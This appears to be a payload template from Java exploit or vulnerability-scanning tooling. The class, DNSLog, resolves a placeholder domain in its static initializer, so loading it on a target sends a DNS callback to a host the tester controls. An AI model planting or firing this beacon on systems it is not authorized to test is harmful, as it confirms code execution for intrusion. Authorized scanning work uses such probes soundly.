package payload;

import java.net.InetAddress;
import java.net.UnknownHostException;

public class DNSLog {
    static {
        try {
            InetAddress.getByName("{{domain}}");
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
    }
}
